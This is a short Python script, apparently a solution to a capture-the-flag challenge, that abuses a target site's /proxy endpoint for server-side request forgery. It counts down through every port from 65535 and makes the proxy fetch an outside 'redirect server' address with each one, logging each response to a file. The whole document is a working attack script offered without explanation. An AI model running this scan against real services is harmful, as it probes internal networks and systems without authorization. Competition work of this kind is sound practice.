import requests

url = "https://school-unblocker.web.actf.co/proxy"

port = 65535

while True:
    try:
        res = requests.post(url, data={"url": f"http://192.0.2.0:4444/{port}"}) # redirect server
        text = res.text
        with open("log.txt", "a") as file:
            file.write(f"[{port}]\n{text}\n")
            file.flush()
        if port < 0:
            break
    except :
        with open("log.txt", "a") as file:
            file.write(f"[{port}]\n-----ERROR-----\n")
            file.flush()
    finally:
        port -= 1